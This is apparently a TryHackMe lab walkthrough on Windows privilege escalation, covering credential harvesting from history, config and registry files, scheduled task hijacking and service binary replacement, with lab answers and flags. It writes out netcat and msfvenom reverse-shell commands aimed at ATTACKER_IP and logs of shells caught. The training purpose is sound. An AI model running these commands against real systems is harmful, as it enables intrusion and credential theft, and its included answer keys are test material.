---
Learn the fundamentals of Windows privilege escalation techniques.
---

![](https://assets.tryhackme.com/room-banners/privesc.png)

### Introduction 

During a penetration test, you will often have access to some Windows hosts with an unprivileged user. Unprivileged users will hold limited access, including their files and folders only, and have no means to perform administrative tasks on the host, preventing you from having complete control over your target.

This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.

 If you want to brush up on your skills first, you can have a look through the Windows Fundamentals Module or the [Hacking Windows Module](https://tryhackme.com/module/hacking-windows-1).

Click and continue learning!
*No answer needed*

###  Windows Privilege Escalation 

Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.

Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

    Misconfigurations on Windows services or scheduled tasks
    Excessive privileges assigned to our account
    Vulnerable software
    Missing Windows security patches

Before jumping into the actual techniques, let's look at the different account types on a Windows system.


Windows Users

Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:
*Administrators*	These users have the most privileges. They can change any system configuration parameter and access any file in the system.
*Standard Users*	These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.

Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.

In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem
	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service
	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
Network Service
	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.

These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.


Users that can change system configurations are part of which group?
*Administrators*

The SYSTEM account has more privileges than the Administrator user (aye/nay)
*aye*

###  Harvesting Passwords from Usual Spots 

The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.

This task will present some known places to look for passwords on a Windows system.

Before going into the task, remember to click the Start Machine button. You will be using the same machine throughout tasks 3 to 5. If you are using the AttackBox, this is also a good moment to start it as you'll be needing it for the following tasks.

In case you prefer connecting to the target machine via RDP, you can use the following credentials:

User: thm-unpriv

Password: Password321
Unattended Windows Installations

Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:

``` cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`. 

```powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:

```
cmdkey /list

```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

```
runas /savecred /user:admin cmd.exe
```

IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

```
Windows PowerShell                                                                                                      Copyright (C) Microsoft Corporation. All rights reserved.                                                                                                                                                                                       PS C:\Users\thm-unpriv> type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt                                                                                                                   ls                                                                                                                      whoami                                                                                                                  whoami /priv                                                                                                            whoami /group                                                                                                           whoami /groups                                                                                                          cmdkey /?                                                                                                               cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z                                                          cmdkey /list                                                                                                            cmdkey /delete:thmdc.local                                                                                              cmdkey /list                                                                                                            runas /?                                                                                                                type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt                   PS C:\Users\thm-unpriv>  
```
A password for the julia.jones user has been left on the Powershell history. What is the password?
*ZuperCkretPa5z *

```
PS C:\Users\thm-unpriv> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString                                                                                                                                       <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />                                                                                            <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />                                                                                                               <connectionStrings>                                                                                                         <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />                                                                                                                    </connectionStrings>                                                                                                PS C:\Users\thm-unpriv>  
```
A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?
*098n0x35skjD3*

```
C:\Users\thm-unpriv>cmdkey /list                                                                                                                                                                                                                Currently stored credentials:                                                                                                                                                                                                                       Target: Domain:interactive=WPRIVESC1\mike.katz                                                                          Type: Domain Password                                                                                                   User: WPRIVESC1\mike.katz                                                                                                                                                                                                                                                                                                                                           C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe                                                             Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...  

Microsoft Windows [Version 10.0.17763.1821]                                                                             (c) 2018 Microsoft Corporation. All rights reserved.                                                                                                                                                                                            C:\Windows\system32>cd ..                                                                                                                                                                                                                       C:\Windows>cd ..                                                                                                                                                                                                                                C:\>dir                                                                                                                  Volume in drive C has no label.                                                                                         Volume Serial Number is A8A4-C362                                                                                                                                                                                                               Directory of C:\                                                                                                                                                                                                                               11/14/2018  06:56 AM    <DIR>          EFI                                                                              05/03/2022  07:51 PM    <DIR>          inetpub                                                                          05/03/2022  07:32 PM    <DIR>          MyPrograms                                                                       05/13/2020  05:58 PM    <DIR>          PerfLogs                                                                         05/03/2022  07:51 PM    <DIR>          Program Files                                                                    05/03/2022  07:51 PM    <DIR>          Program Files (x86)                                                              05/03/2022  11:41 AM    <DIR>          tasks                                                                            05/04/2022  08:05 AM    <DIR>          tools                                                                            05/03/2022  08:20 PM    <DIR>          Users                                                                            05/03/2022  07:51 PM    <DIR>          Windows                                                                                         0 File(s)              0 bytes                                                                                         10 Dir(s)  14,820,904,960 bytes free                                                                                                                                                                                              C:\>cd Users                                                                                                                                                                                                                                    C:\Users>dir                                                                                                             Volume in drive C has no label.                                                                                         Volume Serial Number is A8A4-C362                                                                                                                                                                                                               Directory of C:\Users                                                                                                                                                                                                                          05/03/2022  08:20 PM    <DIR>          .                                                                                05/03/2022  08:20 PM    <DIR>          ..                                                                               05/03/2022  08:20 PM    <DIR>          .NET v4.5                                                                        05/03/2022  08:19 PM    <DIR>          .NET v4.5 Classic                                                                05/03/2022  07:44 PM    <DIR>          Administrator                                                                    05/03/2022  08:15 PM    <DIR>          mike.katz                                                                        12/12/2018  07:45 AM    <DIR>          Public                                                                           05/03/2022  12:04 PM    <DIR>          svcusr1                                                                          05/03/2022  02:58 PM    <DIR>          svcusr2                                                                          05/03/2022  07:38 PM    <DIR>          svcusr3                                                                          05/03/2022  11:41 AM    <DIR>          taskusr1                                                                         05/03/2022  03:14 PM    <DIR>          thm-unpriv                                                                                      0 File(s)              0 bytes                                                                                         12 Dir(s)  14,820,839,424 bytes free                                                                                                                                                                                              C:\Users>cd mike.katz                                                                                                                                                                                                                           C:\Users\mike.katz>dir                                                                                                   Volume in drive C has no label.                                                                                         Volume Serial Number is A8A4-C362                                                                                                                                                                                                               Directory of C:\Users\mike.katz                                                                                                                                                                                                                05/03/2022  08:15 PM    <DIR>          .                                                                                05/03/2022  08:15 PM    <DIR>          ..                                                                               05/04/2022  05:17 AM    <DIR>          Desktop                                                                          05/03/2022  08:15 PM    <DIR>          Documents                                                                        09/15/2018  07:19 AM    <DIR>          Downloads                                                                        09/15/2018  07:19 AM    <DIR>          Favorites                                                                        09/15/2018  07:19 AM    <DIR>          Links                                                                            09/15/2018  07:19 AM    <DIR>          Music                                                                            09/15/2018  07:19 AM    <DIR>          Pictures                                                                         09/15/2018  07:19 AM    <DIR>          Saved Games                                                                      09/15/2018  07:19 AM    <DIR>          Videos                                                                                          0 File(s)              0 bytes                                                                                         11 Dir(s)  14,820,839,424 bytes free                                                                                                                                                                                              C:\Users\mike.katz>cd Desktop                                                                                                                                                                                                                   C:\Users\mike.katz\Desktop>dir                                                                                           Volume in drive C has no label.                                                                                         Volume Serial Number is A8A4-C362                                                                                                                                                                                                               Directory of C:\Users\mike.katz\Desktop                                                                                                                                                                                                        05/04/2022  05:17 AM    <DIR>          .                                                                                05/04/2022  05:17 AM    <DIR>          ..                                                                               06/21/2016  03:36 PM               527 EC2 Feedback.website                                                             06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website                                              05/04/2022  05:17 AM                24 flag.txt                                                                                        3 File(s)          1,105 bytes                                                                                          2 Dir(s)  14,820,839,424 bytes free                                                                                                                                                                                              C:\Users\mike.katz\Desktop>more flag.txt                                                                                THM{WHAT_IS_MY_PASSWORD}  
```
There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.
*THM{WHAT_IS_MY_PASSWORD} *

```
C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s                                                                                                                                              HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server                                                     ProxyExcludeList    REG_SZ                                                                                              ProxyDNS    REG_DWORD    0x1                                                                                            ProxyLocalhost    REG_DWORD    0x0                                                                                      ProxyMethod    REG_DWORD    0x0                                                                                         ProxyHost    REG_SZ    proxy                                                                                            ProxyPort    REG_DWORD    0x50                                                                                          ProxyUsername    REG_SZ    thom.smith                                                                                   ProxyPassword    REG_SZ    CoolPass2021                                                                                 ProxyTelnetCommand    REG_SZ    connect %host %port\n                                                                   ProxyLogToTerm    REG_DWORD    0x1                                                                                                                                                                                                          End of search: 10 match(es) found.  
```
Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?
*CoolPass2021*

###  Other Quick Wins 

Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.


Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:

```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:

```
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

nc -lvp 4444

The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:

```
C:\> schtasks /run /tn vulntask
```

And you will receive the reverse shell with taskusr1 privileges as expected:

```

Kali Linux

user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1

        
```

Go to taskusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.90.7 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

```
C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        9/1/2022 2:35:37 PM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

C:\Users\thm-unpriv>icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\thm-unpriv>C:\> echo c:\tools\nc64.exe -e cmd.exe 10.11.81.220 4444 > C:\tasks\schtask.bat
'C:\' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe 10.11.81.220 4444 > C:\tasks\schtask.bat

kali linux 
nc -lvnp 4444

C:\Users\thm-unpriv>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4444          
listening on [any] 4444 ...
connect to [10.11.81.220] from (UNKNOWN) [10.10.90.7] 49740
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\taskusr1

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
05/03/2022  07:51 PM    <DIR>          inetpub
05/03/2022  07:32 PM    <DIR>          MyPrograms
05/13/2020  05:58 PM    <DIR>          PerfLogs
05/03/2022  07:51 PM    <DIR>          Program Files
05/03/2022  07:51 PM    <DIR>          Program Files (x86)
05/03/2022  11:41 AM    <DIR>          tasks
05/04/2022  08:05 AM    <DIR>          tools
05/03/2022  08:20 PM    <DIR>          Users
05/03/2022  07:51 PM    <DIR>          Windows
               0 File(s)              0 bytes
              10 Dir(s)  14,822,309,888 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

05/03/2022  08:20 PM    <DIR>          .
05/03/2022  08:20 PM    <DIR>          ..
05/03/2022  08:20 PM    <DIR>          .NET v4.5
05/03/2022  08:19 PM    <DIR>          .NET v4.5 Classic
05/03/2022  07:44 PM    <DIR>          Administrator
05/03/2022  08:15 PM    <DIR>          mike.katz
12/12/2018  07:45 AM    <DIR>          Public
05/03/2022  12:04 PM    <DIR>          svcusr1
05/03/2022  02:58 PM    <DIR>          svcusr2
05/03/2022  07:38 PM    <DIR>          svcusr3
05/03/2022  11:41 AM    <DIR>          taskusr1
05/03/2022  03:14 PM    <DIR>          thm-unpriv
               0 File(s)              0 bytes
              12 Dir(s)  14,822,309,888 bytes free

C:\Users>cd taskusr1    
cd taskusr1

C:\Users\taskusr1>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\taskusr1

05/03/2022  11:41 AM    <DIR>          .
05/03/2022  11:41 AM    <DIR>          ..
05/03/2022  01:00 PM    <DIR>          Desktop
05/03/2022  11:41 AM    <DIR>          Documents
09/15/2018  07:19 AM    <DIR>          Downloads
09/15/2018  07:19 AM    <DIR>          Favorites
09/15/2018  07:19 AM    <DIR>          Links
09/15/2018  07:19 AM    <DIR>          Music
09/15/2018  07:19 AM    <DIR>          Pictures
09/15/2018  07:19 AM    <DIR>          Saved Games
09/15/2018  07:19 AM    <DIR>          Videos
               0 File(s)              0 bytes
              11 Dir(s)  14,822,309,888 bytes free

C:\Users\taskusr1>cd Desktop
cd Desktop

C:\Users\taskusr1\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\taskusr1\Desktop

05/03/2022  01:00 PM    <DIR>          .
05/03/2022  01:00 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
05/03/2022  01:00 PM                19 flag.txt
               3 File(s)          1,100 bytes
               2 Dir(s)  14,822,309,888 bytes free

C:\Users\taskusr1\Desktop>more flag.txt
more flag.txt
THM{TASK_COMPLETED}

C:\Users\taskusr1\Desktop>

```
What is the taskusr1 flag?
*THM{TASK_COMPLETED}*

### Abusing Service Misconfigurations 

Windows Services

Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

```
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png)

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png)

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.


Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:

```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:

```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

        
```

We can then pull the payload from Powershell with the following command:

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

We start a reverse listener on our attacker machine:

```

Kali Linux

user@attackerpc$ nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
```Command Prompt

C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
        
```
Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

```

Kali Linux

user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1

```

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, followed by the given parameters:

```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:

```

Command Prompt

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

```

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

```
Command	                  Argument 1	              Argument 2
C:\MyPrograms\Disk.exe	 Sorter	              Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk      Sorter.exe	          Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe	
```

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.


From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under `C:\Program Files or C:\Program Files (x86)` by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

	In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:

```

Command Prompt

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

        
```
The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
```
